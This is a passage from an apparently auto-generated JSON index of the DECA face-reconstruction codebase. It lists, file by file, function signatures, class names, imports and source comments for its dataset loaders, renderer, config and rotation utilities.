        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/vggface.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, K, image_size, scale, trans_scale = 0, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):",
          "def __init__(self, K, image_size, scale, trans_scale = 0, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):"
        ],
        "class_defs": [
          "class VGGFace2Dataset(Dataset):",
          "class VGGFace2HQDataset(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset"
        ],
        "comments": [
          "# hq:",
          "# datafile = '/ps/scratch/face2d3d/texture_in_the_wild_code/VGGFace2_cleaning_codes/ringnetpp_training_lists/second_cleaning/vggface2_bbx_size_bigger_than_400_train_list_max_normal_100_ring_5_1_serial.npy'",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):",
          "# hq:",
          "# datafile = '/ps/scratch/face2d3d/texture_in_the_wild_code/VGGFace2_cleaning_codes/ringnetpp_training_lists/second_cleaning/vggface2_bbx_size_bigger_than_400_train_list_max_normal_100_ring_5_1_serial.npy'",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/build_datasets.py",
        "docstrings": [],
        "function_defs": [
          "def build_train(config, is_train=True):",
          "def build_val(config, is_train=True):"
        ],
        "class_defs": [],
        "imports": [
          "import os, sys",
          "import torch",
          "from torch.utils.data import Dataset, ConcatDataset",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from .vggface import VGGFace2Dataset",
          "from .ethnicity import EthnicityDataset",
          "from .aflw2000 import AFLW2000",
          "from .now import NoWDataset",
          "from .vox import VoxelDataset"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/datasets.py",
        "docstrings": [],
        "function_defs": [
          "def video2sequence(video_path, sample_step=10):",
          "def __init__(self, testpath, iscrop=True, crop_size=224, scale=1.25, face_detector='fan', sample_step=10):",
          "def __len__(self):",
          "def bbox2point(self, left, right, top, bottom, type='bbox'):",
          "def __getitem__(self, index):"
        ],
        "class_defs": [
          "class TestData(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "from torch.utils.data import Dataset, DataLoader",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "import scipy.io",
          "from . import detectors"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# if count%sample_step == 0:",
          "# print('total {} images'.format(len(self.imagepath_list)))",
          "# elif face_detector == 'mtcnn':",
          "#     self.face_detector = detectors.MTCNN()",
          "# provide kpt as txt file, or mat file (for AFLW2000)"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/now.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, ring_elements=6, crop_size=224, scale=1.6):",
          "def __len__(self):",
          "def __getitem__(self, index):"
        ],
        "class_defs": [
          "class NoWDataset(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset"
        ],
        "comments": [
          "# self.data_path = '/ps/scratch/face2d3d/ringnetpp/eccv/test_data/evaluation/NoW_Dataset/final_release_version/test_image_paths_ring_6_elements.npy'",
          "# self.imagepath = '/ps/scratch/face2d3d/ringnetpp/eccv/test_data/evaluation/NoW_Dataset/final_release_version/iphone_pictures/'",
          "# self.bbxpath = '/ps/scratch/face2d3d/ringnetpp/eccv/test_data/evaluation/NoW_Dataset/final_release_version/detected_face/'",
          "# box = np.array([[bbx_data['left'], bbx_data['top']], [bbx_data['right'], bbx_data['bottom']]]).astype('float32')",
          "# crop image",
          "# 'tform': tform,",
          "# 'original_image': torch.tensor(image.transpose(2,0,1)).float(),"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/detectors.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def run(self, image):",
          "def __init__(self, device = 'cpu'):",
          "def run(self, input):"
        ],
        "class_defs": [
          "class FAN(object):",
          "class MTCNN(object):"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import face_alignment",
          "from facenet_pytorch import MTCNN as mtcnn"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/train_datasets.py",
        "docstrings": [],
        "function_defs": [
          "def build_dataloader(config, is_train=True):",
          "def __init__(self, K, image_size, scale, trans_scale = 0, dataname='vox2', n_train=100000, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):",
          "def __init__(self, image_size, scale, trans_scale = 0, isEval=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):",
          "def __init__(self, image_size, scale, trans_scale = 0, isEval=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):",
          "def video2sequence(video_path):",
          "def __init__(self, testpath, iscrop=True, crop_size=224, scale=1.25, face_detector='fan', face_detector_model=None):",
          "def __len__(self):",
          "def __getitem__(self, index):",
          "def __init__(self, testpath, kptfolder, iscrop=True, crop_size=224, scale=1.25, face_detector='fan', face_detector_model=None):",
          "def __len__(self):",
          "def __getitem__(self, index):"
        ],
        "class_defs": [
          "class VoxelDataset(Dataset):",
          "class COCODataset(Dataset):",
          "class CelebAHQDataset(Dataset):",
          "class TestData(Dataset):",
          "class EvalData(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from . import detectors"
        ],
        "comments": [
          "# print('---- data length: ', len(train_dataset))",
          "# if key not in self.face_dict.keys():",
          "#     self.face_dict[key] = []",
          "# clean version: filter out images with bad lanmark labels, may lack extreme pose example",
          "# filter face",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):",
          "# 53877 faces",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# 'mask': mask_array",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):",
          "# 53877 faces",
          "# print(kpt_path, kpt.shape)",
          "# kpt = kpt[:,:2]",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# 'mask': mask_array",
          "# crop image",
          "# src_pts = np.array([[center[0]-size/2, center[1]-size/2], [center[0] - size/2, center[1]+size/2], [center[0]+size/2, center[1]-size/2]])",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):",
          "########################## testing",
          "# import ipdb; ipdb.set_trace()",
          "# print(image.shape)",
          "# print(image_small.shape)",
          "# exit()",
          "# d = detected_faces[0].rect ## only use the first detected face (assume that each input image only contains one face)",
          "# left = d.left(); right = d.right(); top = d.top(); bottom = d.bottom()",
          "# print('total {} images'.format(len(self.imagepath_list)))"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/ethnicity.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, K, image_size, scale, trans_scale = 0, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):"
        ],
        "class_defs": [
          "class EthnicityDataset(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset"
        ],
        "comments": [
          "# hq:",
          "# datafile = '/ps/scratch/face2d3d/texture_in_the_wild_code/VGGFace2_cleaning_codes/ringnetpp_training_lists/second_cleaning/vggface2_bbx_size_bigger_than_400_train_list_max_normal_100_ring_5_1_serial.npy'",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/config.py",
        "docstrings": [],
        "function_defs": [
          "def get_cfg_defaults():\n\"\"\"Get a yacs CfgNode object with default values for my_project.\"\"\"\n# Return a clone so that the defaults will not be altered\n# This is for the \"local variable\" use pattern\nreturn cfg.clone()\n\ndef update_cfg(cfg, cfg_file):\ncfg.merge_from_file(cfg_file)\nreturn cfg.clone()\n",
          "def update_cfg(cfg, cfg_file):",
          "def parse_args():"
        ],
        "class_defs": [],
        "imports": [
          "from yacs.config import CfgNode as CN",
          "import argparse",
          "import yaml",
          "import os"
        ],
        "comments": [
          "# ---------------------------------------------------------------------------- #",
          "# Options for Face model",
          "# ---------------------------------------------------------------------------- #",
          "# texture data original from http://files.is.tue.mpg.de/tbolkart/FLAME/FLAME_texture_data.zip",
          "# face recognition model",
          "## details",
          "# ---------------------------------------------------------------------------- #",
          "# Options for Dataset",
          "# ---------------------------------------------------------------------------- #",
          "# cfg.dataset.training_data = ['ethnicity']",
          "# ---------------------------------------------------------------------------- #",
          "# Options for training",
          "# ---------------------------------------------------------------------------- #",
          "# ---------------------------------------------------------------------------- #",
          "# Options for Losses",
          "# ---------------------------------------------------------------------------- #",
          "# loss for detail",
          "# Return a clone so that the defaults will not be altered",
          "# This is for the \"local variable\" use pattern",
          "# import ipdb; ipdb.set_trace()"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/util.py",
        "docstrings": [],
        "function_defs": [
          "def upsample_mesh(vertices, normals, faces, displacement_map, texture_map, dense_template):",
          "def write_obj(obj_name,",
          "def load_obj(obj_filename):\n\"\"\" Ref: https://github.com/facebookresearch/pytorch3d/blob/25c065e9dafa90163e7cec873dbb324a637c68b7/pytorch3d/io/obj_io.py\nLoad a mesh from a file-like object.\n\"\"\"",
          "def generate_triangles(h, w, margin_x=2, margin_y=5, mask = None):",
          "def face_vertices(vertices, faces):\n\"\"\"\n:param vertices: [batch size, number of vertices, 3]\n:param faces: [batch size, number of faces, 3]\n:return: [batch size, number of faces, 3, 3]\n\"\"\"",
          "def vertex_normals(vertices, faces):\n\"\"\"\n:param vertices: [batch size, number of vertices, 3]\n:param faces: [batch size, number of faces, 3]\n:return: [batch size, number of vertices, 3]\n\"\"\"",
          "def batch_orth_proj(X, camera):",
          "def gaussian(window_size, sigma):",
          "def gauss_fcn(x):",
          "def get_gaussian_kernel(kernel_size: int, sigma: float):\nr\"\"\"Function that returns Gaussian filter coefficients.\n\nArgs:\nkernel_size (int): filter size. It should be odd and positive.\nsigma (float): gaussian standard deviation.\n\nReturns:\nTensor: 1D tensor with gaussian filter coefficients.\n",
          "def get_gaussian_kernel2d(kernel_size, sigma):\nr\"\"\"Function that returns Gaussian filter matrix coefficients.\n\nArgs:\nkernel_size (Tuple[int, int]): filter sizes in the x and y direction.\nSizes should be odd and positive.\nsigma (Tuple[int, int]): gaussian standard deviation in the x and y\ndirection.\n\nReturns:",
          "def gaussian_blur(x, kernel_size=(3,3), sigma=(0.8,0.8)):",
          "def _compute_binary_kernel(window_size):\nr\"\"\"Creates a binary kernel to extract the patches. If the window size\nis HxW will create a (H*W)xHxW kernel.\n\"\"\"",
          "def median_blur(x, kernel_size=(3,3)):",
          "def get_laplacian_kernel2d(kernel_size: int):\nr\"\"\"Function that returns Gaussian filter matrix coefficients.\n\nArgs:\nkernel_size (int): filter size should be odd.\n\nReturns:\nTensor: 2D tensor with laplacian filter matrix coefficients.\n\nShape:",
          "def laplacian(x):",
          "def angle2matrix(angles):",
          "def binary_erosion(tensor, kernel_size=5):",
          "def flip_image(src_image, kps):",
          "def copy_state_dict(cur_state_dict, pre_state_dict, prefix='', load_name=None):",
          "def _get_params(key):",
          "def check_mkdir(path):",
          "def check_mkdirlist(pathlist):",
          "def tensor2image(tensor):",
          "def dict2obj(d):",
          "def __init__(self, **kwargs):",
          "def remove_module(state_dict):",
          "def dict_tensor2npy(tensor_dict):",
          "def plot_kpts(image, kpts, color = 'r'):",
          "def plot_verts(image, kpts, color = 'r'):",
          "def tensor_vis_landmarks(images, landmarks, gt_landmarks=None, color = 'g', isScale=True):",
          "def load_local_mask(image_size=256, mode='bbx'):",
          "def visualize_grid(visdict, savepath=None, size=224, dim=1, return_gird=True):"
        ],
        "class_defs": [
          "class C(object):",
          "class Struct(object):"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "import math",
          "from collections import OrderedDict",
          "import os",
          "from scipy.ndimage import morphology",
          "from skimage.io import imsave",
          "import cv2",
          "import torchvision"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# borrowed from https://github.com/YadiraF/PRNet/blob/master/utils/write.py",
          "# mesh lab start with 1, python/c++ start from 0",
          "# write obj",
          "# first line: write mtlib(material library)",
          "# f.write('# %s\\n' % os.path.basename(obj_name))",
          "# f.write('#\\n')",
          "# f.write('\\n')",
          "# write vertices",
          "# write uv coords",
          "# write f: ver ind/ uv ind",
          "#  faces[i, 2], uvfaces[i, 2],",
          "#  faces[i, 1], uvfaces[i, 1],",
          "#  faces[i, 0], uvfaces[i, 0]",
          "# write mtl",
          "# out_normal_map = normal_map / (np.linalg.norm(",
          "#     normal_map, axis=-1, keepdims=True) + 1e-9)",
          "# out_normal_map = (out_normal_map + 1) * 0.5",
          "# (out_normal_map * 255).astype(np.uint8)[:, :, ::-1]",
          "## load obj,  similar to load_obj from pytorch3d",
          "# startswith expects each line to be a string. If the file is read in as",
          "# bytes then first decode to strings.",
          "# Update face properties info.",
          "# Vertex index.",
          "# Texture index is present e.g. f 4/1/1.",
          "# ---------------------------- process/generate vertices, normals, faces",
          "# quad layout:",
          "# 0 1 ... w-1",
          "# w w+1",
          "#.",
          "# w*h",
          "# borrowed from https://github.com/daniilidis-group/neural_renderer/blob/master/neural_renderer/vertices_to_faces.py",
          "# pytorch only supports long and byte tensors for indexing",
          "# pytorch only supports long and byte tensors for indexing",
          "# -------------------------------------- image processing",
          "# borrowed from: https://torchgeometry.readthedocs.io/en/latest/_modules/kornia/filters",
          "# https://torchgeometry.readthedocs.io/en/latest/_modules/kornia/filters/laplacian.html",
          "# Rz.dot(Ry.dot(Rx))",
          "# tensor: [bz, 1, h, w].",
          "# -------------------------------------- io",
          "# print('parameter {} not found'.format(k))",
          "# print('copy param {} failed'.format(k))",
          "# if isinstance(d, list):",
          "#     d = [dict2obj(x) for x in d]",
          "# original saved file with DataParallel",
          "# create new OrderedDict that does not contain `module.`",
          "# ---------------------------------- visualization",
          "# visualize landmarks",
          "############### for training",
          "# UV space face attributes bbx in size 2048 (l r t b)",
          "# face = np.array([512, 1536, 512, 1536]) #",
          "# if image_size == 512:",
          "# face = np.array([400, 400+512*2, 400, 400+512*2])",
          "# face = np.array([512, 512+512*2, 512, 512+512*2])"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 9,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/renderer.py",
        "docstrings": [],
        "function_defs": [
          "def set_rasterizer(type = 'pytorch3d'):",
          "def __init__(self, height, width=None):\n\"\"\"\nuse fixed raster_settings for rendering faces\n\"\"\"",
          "def forward(self, vertices, faces, attributes=None, h=None, w=None):",
          "def __init__(self, image_size=224):\n\"\"\"\nuse fixed raster_settings for rendering faces\n\"\"\"",
          "def forward(self, vertices, faces, attributes=None, h=None, w=None):",
          "def __init__(self, image_size, obj_filename, uv_size=256, rasterizer_type='pytorch3d'):",
          "def forward(self, vertices, transformed_vertices, albedos, lights=None, h=None, w=None, light_type='point', background=None):",
          "def add_SHlight(self, normal_images, sh_coeff):",
          "def add_pointlight(self, vertices, normals, lights):",
          "def add_directionlight(self, normals, lights):",
          "def render_shape(self, vertices, transformed_vertices, colors = None, images=None, detail_normal_images=None,",
          "def render_depth(self, transformed_vertices):",
          "def render_colors(self, transformed_vertices, colors):",
          "def world2uv(self, vertices):"
        ],
        "class_defs": [
          "class StandardRasterizer(nn.Module):",
          "class Pytorch3dRasterizer(nn.Module):",
          "class SRenderY(nn.Module):"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "from skimage.io import imread",
          "import imageio",
          "from . import util",
          "from pytorch3d.structures import Meshes",
          "from pytorch3d.io import load_obj",
          "from pytorch3d.renderer.mesh import rasterize_meshes",
          "import os",
          "from .util import load_obj",
          "from torch.utils.cpp_extension import load, CUDA_HOME",
          "from standard_rasterize_cuda import standard_rasterize"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# Use JIT Compiling Extensions",
          "# ref: https://pytorch.org/tutorials/advanced/cpp_extension.html",
          "# If JIT does not work, try manually installation first",
          "# 1. see instruction here: pixielib/utils/rasterizer/INSTALL.md",
          "# 2. add this: \"from .rasterizer.standard_rasterize_cuda import standard_rasterize\" here",
          "# compatibale with pytorch3d ndc, see https://github.com/facebookresearch/pytorch3d/blob/e42b0c4f704fa0f5e262f370dccac537b5edf2b1/pytorch3d/csrc/rasterize_meshes/rasterize_meshes.cu#L232",
          "#",
          "## TODO: add support for rendering non-squared images, since pytorc3d supports this now",
          "# print(image_size)",
          "# import ipdb; ipdb.set_trace()",
          "# faces",
          "# uv coords",
          "# shape colors, for rendering shape overlay",
          "## SH factors for lighting",
          "## rasterizer near 0 far 100. move mesh so minz larger than 0",
          "# attributes",
          "# rasterize",
          "####",
          "# vis mask",
          "# albedo",
          "# visible mask for pixels with positive normal direction",
          "# shading",
          "# normals_dot_lights = torch.clamp((normals[:,None,:,:]*directions_to_lights).sum(dim=3), 0., 1.)",
          "# normals_dot_lights = torch.clamp((normals[:,None,:,:]*directions_to_lights).sum(dim=3), 0., 1.)",
          "# normals_dot_lights = (normals[:,None,:,:]*directions_to_lights).sum(dim=3)",
          "# set lighting",
          "# Attributes",
          "# rasterize",
          "# import ipdb; ipdb.set_trace()",
          "####",
          "# albedo",
          "# mask",
          "# shading",
          "# Attributes",
          "# rasterize",
          "####",
          "# Attributes",
          "# rasterize",
          "####"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/rotation_converter.py",
        "docstrings": [],
        "function_defs": [
          "def rad2deg(tensor):\n\"\"\"Function that converts angles from radians to degrees.\n\nSee :class:`~torchgeometry.RadToDeg` for details.\n\nArgs:\ntensor (Tensor): Tensor of arbitrary shape.\n\nReturns:\nTensor: Tensor with same shape as input.",
          "def deg2rad(tensor):\n\"\"\"Function that converts angles from degrees to radians.\n\nSee :class:`~torchgeometry.DegToRad` for details.\n\nArgs:\ntensor (Tensor): Tensor of arbitrary shape.\n\nReturns:\nTensor: Tensor with same shape as input.",
          "def euler_to_quaternion(r):",
          "def rotation_matrix_to_quaternion(rotation_matrix, eps=1e-6):\n\"\"\"Convert 3x4 rotation matrix to 4d quaternion vector\n\nThis algorithm is based on algorithm described in\nhttps://github.com/KieranWynn/pyquaternion/blob/master/pyquaternion/quaternion.py#L201\n\nArgs:\nrotation_matrix (Tensor): the rotation matrix to convert.\n\nReturn:",
          "def angle_axis_to_quaternion(angle_axis: torch.Tensor) -> torch.Tensor:\n\"\"\"Convert an angle axis to a quaternion.\n\nAdapted from ceres C++ library: ceres-solver/include/ceres/rotation.h\n\nArgs:\nangle_axis (torch.Tensor): tensor with angle axis.\n\nReturn:\ntorch.Tensor: tensor with quaternion.",
          "def quaternion_to_rotation_matrix(quat):\n\"\"\"Convert quaternion coefficients to rotation matrix.\nArgs:\nquat: size = [B, 4] 4 <===>(w, x, y, z)\nReturns:\nRotation matrix corresponding to the quaternion -- size = [B, 3, 3]\n\"\"\"",
          "def quaternion_to_angle_axis(quaternion: torch.Tensor):\n\"\"\"Convert quaternion vector to angle axis of rotation. TODO: CORRECT\n\nAdapted from ceres C++ library: ceres-solver/include/ceres/rotation.h\n\nArgs:\nquaternion (torch.Tensor): tensor with quaternions.\n\nReturn:\ntorch.Tensor: tensor with angle axis of rotation.",
          "def batch_euler2axis(r):",
          "def batch_euler2matrix(r):",
          "def batch_matrix2euler(rot_mats):",
          "def batch_matrix2axis(rot_mats):",
          "def batch_axis2matrix(theta):",
          "def batch_axis2euler(theta):",
          "def batch_axis2euler(r):",
          "def batch_orth_proj(X, camera):",
          "def batch_rodrigues(rot_vecs, epsilon=1e-8, dtype=torch.float32):"
        ],
        "class_defs": [],
        "imports": [
          "import torch"
        ],
        "comments": [
          "# \"angle_axis_to_rotation_matrix\", batch_rodrigues",
          "# \"angle_axis_to_quaternion\",",
          "#",
          "######### to quaternion",
          "# if not rotation_matrix.shape[-2:] == (3, 4):",
          "#     raise ValueError(",
          "#         \"Input size must be a N x 3 x 4  tensor. Got {}\".format(",
          "#             rotation_matrix.shape))",
          "# def angle_axis_to_quaternion(theta):",
          "#     batch_size = theta.shape[0]",
          "#     l1norm = torch.norm(theta + 1e-8, p=2, dim=1)",
          "#     angle = torch.unsqueeze(l1norm, -1)",
          "#     normalized = torch.div(theta, angle)",
          "#     angle = angle * 0.5",
          "#     v_cos = torch.cos(angle)",
          "#     v_sin = torch.sin(angle)",
          "#     quat = torch.cat([v_cos, v_sin * normalized], dim=1)",
          "#     return quat",
          "# unpack input and compute conversion",
          "#### quaternion to",
          "# unpack input and compute conversion",
          "#### batch converter",
          "# Calculates rotation matrix to euler angles",
          "# Careful for extreme cases of eular angles like [0.0, pi, 0.0]",
          "### only y?",
          "# TODO:",
          "# angle axis to rotation matrix",
          "# theta N x 3",
          "# return quat2mat(quat)",
          "# batch_rodrigues",
          "# Bx1 arrays"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": []
      },
      {
